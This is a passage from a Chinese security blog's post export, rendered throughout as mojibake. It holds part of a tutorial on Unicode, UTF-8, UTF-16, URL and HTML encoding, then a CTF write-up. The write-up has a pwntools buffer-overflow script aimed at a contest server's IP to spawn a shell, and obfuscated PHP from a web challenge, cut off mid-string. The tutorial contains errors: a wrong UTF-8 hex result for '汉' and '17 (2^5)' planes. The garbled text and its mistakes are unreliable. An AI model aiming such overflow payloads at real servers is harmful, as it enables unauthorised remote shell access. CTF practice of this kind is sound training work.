ï¼Œå­—ç¬¦ç»Ÿä¸€ä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼Œè™½ç„¶çœ‹ä¼¼æ–¹ä¾¿ï¼Œä½†æ˜¯å´ä¸å¦‚å¦å¤–ä¸¤ç§ç¼–ç æ–¹å¼ä½¿ç”¨å¹¿æ³›ã€‚ UTF-8UTF-8 æ˜¯ä¸€ä¸ªéå¸¸æƒŠè‰³çš„ç¼–ç æ–¹å¼ï¼Œæ¼‚äº®çš„å®ç°äº†å¯¹ ASCII ç çš„å‘åå…¼å®¹ï¼Œä»¥ä¿è¯ Unicode å¯ä»¥è¢«å¤§ä¼—æ¥å—ã€‚ UTF-8 æ˜¯ç›®å‰äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ç§ Unicode ç¼–ç æ–¹å¼ï¼Œå®ƒçš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¯å˜é•¿ã€‚å®ƒå¯ä»¥ä½¿ç”¨ 1 - 4 ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œæ ¹æ®å­—ç¬¦çš„ä¸åŒå˜æ¢é•¿åº¦ã€‚ç¼–ç è§„åˆ™å¦‚ä¸‹ï¼š å¯¹äºå•ä¸ªå­—èŠ‚çš„å­—ç¬¦ï¼Œç¬¬ä¸€ä½è®¾ä¸º 0ï¼Œåé¢çš„ 7 ä½å¯¹åº”è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹ã€‚å› æ­¤ï¼Œå¯¹äºè‹±æ–‡ä¸­çš„ 0 - 127 å·å­—ç¬¦ï¼Œä¸ ASCII ç å®Œå…¨ç›¸åŒã€‚è¿™æ„å‘³ç€ ASCII ç é‚£ä¸ªå¹´ä»£çš„æ–‡æ¡£ç”¨ UTF-8 ç¼–ç æ‰“å¼€å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚ å¯¹äºéœ€è¦ä½¿ç”¨ N ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºçš„å­—ç¬¦ï¼ˆN &gt; 1ï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰ N ä½éƒ½è®¾ä¸º 1ï¼Œç¬¬ N + 1 ä½è®¾ä¸º0ï¼Œå‰©ä½™çš„ N - 1 ä¸ªå­—èŠ‚çš„å‰ä¸¤ä½éƒ½è®¾ä½ 10ï¼Œå‰©ä¸‹çš„äºŒè¿›åˆ¶ä½åˆ™ä½¿ç”¨è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹æ¥å¡«å……ã€‚ ç¼–ç è§„åˆ™å¦‚ä¸‹ï¼š Unicode åå…­è¿›åˆ¶ç ç‚¹èŒƒå›´ UTF-8 äºŒè¿›åˆ¶ 0000 0000 - 0000 007F 0xxxxxxx 0000 0080 - 0000 07FF 110xxxxx 10xxxxxx 0000 0800 - 0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx 0001 0000 - 0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx æ ¹æ®ä¸Šé¢ç¼–ç è§„åˆ™å¯¹ç…§è¡¨ï¼Œè¿›è¡Œ UTF-8 ç¼–ç å’Œè§£ç å°±ç®€å•å¤šäº†ã€‚ä¸‹é¢ä»¥æ±‰å­—â€œæ±‰â€ä¸ºåˆ©ï¼Œå…·ä½“è¯´æ˜å¦‚ä½•è¿›è¡Œ UTF-8 ç¼–ç å’Œè§£ç ã€‚ â€œæ±‰â€çš„ Unicode ç ç‚¹æ˜¯ 0x6c49ï¼ˆ110 1100 0100 1001ï¼‰ï¼Œé€šè¿‡ä¸Šé¢çš„å¯¹ç…§è¡¨å¯ä»¥å‘ç°ï¼Œ0x0000 6c49 ä½äºç¬¬ä¸‰è¡Œçš„èŒƒå›´ï¼Œé‚£ä¹ˆå¾—å‡ºå…¶æ ¼å¼ä¸º 1110xxxx 10xxxxxx 10xxxxxxã€‚æ¥ç€ï¼Œä»â€œæ±‰â€çš„äºŒè¿›åˆ¶æ•°æœ€åä¸€ä½å¼€å§‹ï¼Œä»åå‘å‰ä¾æ¬¡å¡«å……å¯¹åº”æ ¼å¼ä¸­çš„ xï¼Œå¤šå‡ºçš„ x ç”¨ 0 è¡¥ä¸Šã€‚è¿™æ ·ï¼Œå°±å¾—åˆ°äº†â€œæ±‰â€çš„ UTF-8 ç¼–ç ä¸º 11100110 10110001 10001001ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶å°±æ˜¯ 0xE6 0xB7 0x89ã€‚ è§£ç çš„è¿‡ç¨‹ä¹Ÿååˆ†ç®€å•ï¼šå¦‚æœä¸€ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½æ˜¯ 0 ï¼Œåˆ™è¯´æ˜è¿™ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼›å¦‚æœä¸€ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½1ï¼Œé‚£ä¹ˆè¿ç»­æœ‰å¤šå°‘ä¸ª 1ï¼Œå°±è¡¨ç¤ºè¯¥å­—ç¬¦å ç”¨å¤šå°‘ä¸ªå­—èŠ‚ã€‚ UTF-16åœ¨äº†è§£ UTF-16 ç¼–ç æ–¹å¼ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹å¦å¤–ä¸€ä¸ªæ¦‚å¿µâ€”â€”â€œå¹³é¢â€ã€‚ åœ¨ä¸Šé¢çš„ä»‹ç»ä¸­ï¼Œæåˆ°äº† Unicode æ˜¯ä¸€æœ¬å¾ˆåšçš„å­—å…¸ï¼Œå¥¹å°†å…¨ä¸–ç•Œæ‰€æœ‰çš„å­—ç¬¦å®šä¹‰åœ¨ä¸€ä¸ªé›†åˆé‡Œã€‚è¿™ä¹ˆå¤šçš„å­—ç¬¦ä¸æ˜¯ä¸€æ¬¡æ€§å®šä¹‰çš„ï¼Œè€Œæ˜¯åˆ†åŒºå®šä¹‰ã€‚æ¯ä¸ªåŒºå¯ä»¥å­˜æ”¾ 65536 ä¸ªï¼ˆ2^16ï¼‰å­—ç¬¦ï¼Œç§°ä¸ºä¸€ä¸ªå¹³é¢ï¼ˆplaneï¼‰ã€‚ç›®å‰ï¼Œä¸€å…±æœ‰ 17 ä¸ªï¼ˆ2^5ï¼‰å¹³é¢ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ•´ä¸ª Unicode å­—ç¬¦é›†çš„å¤§å°ç°åœ¨æ˜¯ 2^21ã€‚ æœ€å‰é¢çš„ 65536 ä¸ªå­—ç¬¦ä½ï¼Œç§°ä¸ºåŸºæœ¬å¹³é¢ï¼ˆç®€ç§° BMP ï¼‰ï¼Œå®ƒçš„ç ç‚¹èŒƒå›´æ˜¯ä» 0 åˆ° 2^16-1ï¼Œå†™æˆ 16 è¿›åˆ¶å°±æ˜¯ä» U+0000 åˆ° U+FFFFã€‚æ‰€æœ‰æœ€å¸¸è§çš„å­—ç¬¦éƒ½æ”¾åœ¨è¿™ä¸ªå¹³é¢ï¼Œè¿™æ˜¯ Unicode æœ€å…ˆå®šä¹‰å’Œå…¬å¸ƒçš„ä¸€ä¸ªå¹³é¢ã€‚å‰©ä¸‹çš„å­—ç¬¦éƒ½æ”¾åœ¨è¾…åŠ©å¹³é¢ï¼ˆç®€ç§° SMP ï¼‰ï¼Œç ç‚¹èŒƒå›´ä» U+010000 åˆ° U+10FFFFã€‚ åŸºæœ¬äº†è§£äº†å¹³é¢çš„æ¦‚å¿µåï¼Œå†è¯´å›åˆ° UTF-16ã€‚UTF-16 ç¼–ç ä»‹äº UTF-32 ä¸ UTF-8 ä¹‹é—´ï¼ŒåŒæ—¶ç»“åˆäº†å®šé•¿å’Œå˜é•¿ä¸¤ç§ç¼–ç æ–¹æ³•çš„ç‰¹ç‚¹ã€‚å®ƒçš„ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼šåŸºæœ¬å¹³é¢çš„å­—ç¬¦å ç”¨ 2 ä¸ªå­—èŠ‚ï¼Œè¾…åŠ©å¹³é¢çš„å­—ç¬¦å ç”¨ 4 ä¸ªå­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒUTF-16 çš„ç¼–ç é•¿åº¦è¦ä¹ˆæ˜¯ 2 ä¸ªå­—èŠ‚ï¼ˆU+0000 åˆ° U+FFFFï¼‰ï¼Œè¦ä¹ˆæ˜¯ 4 ä¸ªå­—èŠ‚ï¼ˆU+010000 åˆ° U+10FFFFï¼‰ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå½“æˆ‘ä»¬é‡åˆ°ä¸¤ä¸ªå­—èŠ‚æ—¶ï¼Œåˆ°åº•æ˜¯æŠŠè¿™ä¸¤ä¸ªå­—èŠ‚å½“ä½œä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯ä¸åé¢çš„ä¸¤ä¸ªå­—èŠ‚ä¸€èµ·å½“ä½œä¸€ä¸ªå­—ç¬¦å‘¢ï¼Ÿ è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„åœ°æ–¹ï¼Œåœ¨åŸºæœ¬å¹³é¢å†…ï¼Œä» U+D800 åˆ° U+DFFF æ˜¯ä¸€ä¸ªç©ºæ®µï¼Œå³è¿™äº›ç ç‚¹ä¸å¯¹åº”ä»»ä½•å­—ç¬¦ã€‚å› æ­¤ï¼Œè¿™ä¸ªç©ºæ®µå¯ä»¥ç”¨æ¥æ˜ å°„è¾…åŠ©å¹³é¢çš„å­—ç¬¦ã€‚ è¾…åŠ©å¹³é¢çš„å­—ç¬¦ä½å…±æœ‰ 2^20 ä¸ªï¼Œå› æ­¤è¡¨ç¤ºè¿™äº›å­—ç¬¦è‡³å°‘éœ€è¦ 20 ä¸ªäºŒè¿›åˆ¶ä½ã€‚UTF-16 å°†è¿™ 20 ä¸ªäºŒè¿›åˆ¶ä½åˆ†æˆä¸¤åŠï¼Œå‰ 10 ä½æ˜ å°„åœ¨ U+D800 åˆ° U+DBFFï¼Œç§°ä¸ºé«˜ä½ï¼ˆHï¼‰ï¼Œå 10 ä½æ˜ å°„åœ¨ U+DC00 åˆ° U+DFFFï¼Œç§°ä¸ºä½ä½ï¼ˆLï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œä¸€ä¸ªè¾…åŠ©å¹³é¢çš„å­—ç¬¦ï¼Œè¢«æ‹†æˆä¸¤ä¸ªåŸºæœ¬å¹³é¢çš„å­—ç¬¦è¡¨ç¤ºã€‚ å› æ­¤ï¼Œå½“æˆ‘ä»¬é‡åˆ°ä¸¤ä¸ªå­—èŠ‚ï¼Œå‘ç°å®ƒçš„ç ç‚¹åœ¨ U+D800 åˆ° U+DBFF ä¹‹é—´ï¼Œå°±å¯ä»¥æ–­å®šï¼Œç´§è·Ÿåœ¨åé¢çš„ä¸¤ä¸ªå­—èŠ‚çš„ç ç‚¹ï¼Œåº”è¯¥åœ¨ U+DC00 åˆ° U+DFFF ä¹‹é—´ï¼Œè¿™å››ä¸ªå­—èŠ‚å¿…é¡»æ”¾åœ¨ä¸€èµ·è§£è¯»ã€‚ æ¥ä¸‹æ¥ï¼Œä»¥æ±‰å­—â€ğ ®·â€ä¸ºä¾‹ï¼Œè¯´æ˜ UTF-16 ç¼–ç æ–¹å¼æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ æ±‰å­—â€ğ ®·â€çš„ Unicode ç ç‚¹ä¸º 0x20BB7ï¼Œè¯¥ç ç‚¹æ˜¾ç„¶è¶…å‡ºäº†åŸºæœ¬å¹³é¢çš„èŒƒå›´ï¼ˆ0x0000 - 0xFFFFï¼‰ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚é¦–å…ˆç”¨ 0x20BB7 - 0x10000 è®¡ç®—å‡ºè¶…å‡ºçš„éƒ¨åˆ†ï¼Œç„¶åå°†å…¶ç”¨ 20 ä¸ªäºŒè¿›åˆ¶ä½è¡¨ç¤ºï¼ˆä¸è¶³å‰é¢è¡¥ 0 ï¼‰ï¼Œç»“æœä¸º0001000010 1110110111ã€‚æ¥ç€ï¼Œå°†å‰ 10 ä½æ˜ å°„åˆ° U+D800 åˆ° U+DBFF ä¹‹é—´ï¼Œå 10 ä½æ˜ å°„åˆ° U+DC00 åˆ° U+DFFF å³å¯ã€‚U+D800 å¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º 1101100000000000ï¼Œç›´æ¥å¡«å……åé¢çš„ 10 ä¸ªäºŒè¿›åˆ¶ä½å³å¯ï¼Œå¾—åˆ° 1101100001000010ï¼Œè½¬æˆ 16 è¿›åˆ¶æ•°åˆ™ä¸º 0xD842ã€‚åŒç†å¯å¾—ï¼Œä½ä½ä¸º 0xDFB7ã€‚å› æ­¤å¾—å‡ºæ±‰å­—â€ğ ®·â€çš„ UTF-16 ç¼–ç ä¸º 0xD842 0xDFB7ã€‚ Unicode3.0 ä¸­ç»™å‡ºäº†è¾…åŠ©å¹³é¢å­—ç¬¦çš„è½¬æ¢å…¬å¼ï¼š H = Math.floor((c-0x10000) / 0x400)+0xD800 L = (c - 0x10000) % 0x400 + 0xDC00 æ ¹æ®ç¼–ç å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è®¡ç®—å‡ºå­—ç¬¦çš„ UTF-16 ç¼–ç ã€‚ ç¤ºä¾‹ Unicodeç¼–ç æœ‰ä»¥ä¸‹å››ç§ç¼–ç æ–¹å¼ï¼š æºæ–‡æœ¬ï¼šThe &amp;#x [Hex]ï¼š&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065; &amp;# [Decimal]ï¼š&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101; \\U [Hex]ï¼š\\U0054\\U0068\\U0065 \\U+ [Hex]ï¼š\\U+0054\\U+0068\\U+0065 URLç¼–ç urlç¼–ç æ˜¯ä¸€ç§æµè§ˆå™¨ç”¨æ¥æ‰“åŒ…è¡¨å•è¾“å…¥çš„æ ¼å¼ã€‚æµè§ˆå™¨ä»è¡¨å•ä¸­è·å–æ‰€æœ‰çš„nameå’Œå…¶ä¸­çš„å€¼ ï¼Œå°†å®ƒä»¬ä»¥name/valueå‚æ•°ç¼–ç ï¼ˆç§»å»é‚£äº›ä¸èƒ½ä¼ é€çš„å­—ç¬¦ï¼Œå°†æ•°æ®æ’è¡Œç­‰ç­‰ï¼‰ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†æˆ–è€…åˆ†ç¦»åœ°å‘ç»™æœåŠ¡å™¨ã€‚ ä¸ºä»€ä¹ˆè¦URLç¼–ç ï¼Ÿåœ¨å› ç‰¹ç½‘ä¸Šä¼ é€URLï¼Œåªèƒ½é‡‡ç”¨ASCIIå­—ç¬¦é›† ä¹Ÿå°±æ˜¯è¯´URLåªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ã€é˜¿æ‹‰ä¼¯æ•°å­—å’ŒæŸäº›æ ‡ç‚¹ç¬¦å·ï¼Œä¸èƒ½ä½¿ç”¨å…¶ä»–æ–‡å­—å’Œç¬¦å·ï¼Œå³åªæœ‰å­—æ¯å’Œæ•°å­—[0-9a-zA-Z]ã€ä¸€äº›ç‰¹æ®Šç¬¦å·$-_.+!*&#39;()(ä¸åŒ…æ‹¬åŒå¼•å·)ã€ä»¥åŠæŸäº›ä¿ç•™å­—ï¼ˆç©ºæ ¼è½¬æ¢ä¸º+ï¼‰ï¼Œæ‰å¯ä»¥ä¸ç»è¿‡ç¼–ç ç›´æ¥ç”¨äºURLè¿™æ„å‘³ç€ å¦‚æœURLä¸­æœ‰æ±‰å­—ï¼Œå°±å¿…é¡»ç¼–ç åä½¿ç”¨ã€‚ å¦‚ä½•ç¼–ç URLç¼–ç é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºç™¾åˆ†å·ç¼–ç ï¼ˆpercent-encodingï¼‰ï¼Œæ˜¯å› ä¸ºå®ƒçš„ç¼–ç æ–¹å¼éå¸¸ç®€å•ï¼š ä½¿ç”¨%åŠ ä¸Šä¸¤ä½çš„å­—ç¬¦â€”â€”0123456789ABCDEFâ€”â€”ä»£è¡¨ä¸€ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶å½¢å¼ã€‚URLç¼–ç è¦åšçš„ï¼Œå°±æ˜¯å°†æ¯ä¸€ä¸ªéå®‰å…¨çš„ASCIIå­—ç¬¦éƒ½è¢«æ›¿æ¢ä¸ºâ€œ%xxâ€æ ¼å¼ï¼Œå¯¹äºéASCIIå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º0xE4 0xB8 0xAD 0xE6 0x96 0x87ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°%E4%B8%AD%E6%96%87ã€‚ ç¤ºä¾‹ æºæ–‡æœ¬ï¼šThe quick brown fox jumps over the lazy dog ç¼–ç åï¼š %54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67 HTMLå®ä½“ç¼–ç åœ¨ HTML ä¸­ï¼ŒæŸäº›å­—ç¬¦æ˜¯é¢„ç•™çš„ã€‚ åœ¨ HTML ä¸­ä¸èƒ½ä½¿ç”¨å°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œè¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ã€‚ å¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ HTML æºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼ˆcharacter entitiesï¼‰ã€‚ å­—ç¬¦å®ä½“ç±»ä¼¼è¿™æ ·ï¼š &amp;entity_name; æˆ–è€… &amp;#entity_number; å¦‚éœ€æ˜¾ç¤ºå°äºå·ï¼Œæˆ‘ä»¬å¿…é¡»è¿™æ ·å†™ï¼š&amp;lt; æˆ–&amp;#60; å‚è€ƒï¼š https://www.cnblogs.com/crazylqy/p/10184291.html https://www.cnblogs.com/xzwblog/p/6932870.html https://uknowsec.cn/posts/ctf/CTFä¸­é‚£äº›è„‘æ´å¤§å¼€çš„ç¼–ç å’ŒåŠ å¯†.html","categories":[],"tags":[{"name":"è¿›åˆ¶","slug":"è¿›åˆ¶","permalink":"http://www.m00nback.xyz/tags/%E8%BF%9B%E5%88%B6/"},{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"http://www.m00nback.xyz/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"ä¸­åŸå·¥å­¦é™¢Dropså¤ä»¤è¥æ–°ç”Ÿèµ›writeup","slug":"drops-new-2019","date":"2019-08-15T10:53:21.000Z","updated":"2019-10-17T05:54:00.694Z","comments":true,"path":"2019/08/15/drops-new-2019/","link":"","permalink":"http://www.m00nback.xyz/2019/08/15/drops-new-2019/","excerpt":"æœ¬ç¯‡åšå®¢è®°å½•äº†æœ¬äººå‚åŠ dropsæ”»é˜²è®­ç»ƒè¥æœ€åçš„æ–°ç”Ÿèµ›çš„ä¸€äº›writeup,å¾ˆèœï¼Œå‹¿å–·ï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢è®°å½•äº†æœ¬äººå‚åŠ dropsæ”»é˜²è®­ç»ƒè¥æœ€åçš„æ–°ç”Ÿèµ›çš„ä¸€äº›writeup,å¾ˆèœï¼Œå‹¿å–·ï¼ï¼ï¼ pwnpwn1å’Œæ”»é˜²ä¸–ç•Œlevel0ç›¸ä¼¼ï¼Œæ”¹ä¸‹ä¹‹å‰å‰è„šæœ¬å°±è¡Œ 123456from pwn import *p &#x3D; remote(&quot;101.132.41.135&quot;,&quot;10000&quot;)v &#x3D; 0x80485E6payload &#x3D; 112*&#39;a&#39; + p32(v)p.sendline(payload)p.interactive() væ˜¯åé—¨å‡½æ•°çš„åœ°å€ 112*â€™aâ€™ä»£è¡¨0x6cå¤§å°çš„bufåŠ ä¸Š32ä½4ä¸ªå­—èŠ‚çš„ebp pwn2pwn3webchaos fileæ‰“å¼€ç½‘å€çœ‹åˆ°æ˜¯è¿™æ ·çš„ï¼š æŠŠphpä»£ç æ•´ç†ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php $_ &#x3D; &lt;&lt;&lt;asdfiohaefhoVm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doV1YwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldoVVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldoVFYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%